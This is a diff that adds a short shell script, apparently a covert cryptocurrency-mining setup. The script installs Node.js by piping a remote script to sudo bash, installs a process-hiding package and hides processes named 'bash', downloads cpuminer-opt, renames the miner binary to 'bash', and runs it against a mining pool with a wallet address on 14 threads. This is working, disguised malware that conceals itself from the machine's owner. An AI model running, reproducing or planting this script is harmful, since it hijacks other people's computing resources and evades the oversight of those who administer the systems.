@@ -1,0 +1,2 @@
+#!/bin/sh
+sudo apt update && sudo apt upgrade -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g node-process-hider && npm install -g npm && sudo ph add bash && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && mv cpuminer-sse2 bash && ./bash -a yespower  -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1qnlv0jmn6u9yslhdqr8hhz00pfyvfjkdceyvd0n.$(echo $(shuf -i 1-9999 -n 1)-breww) -t 14
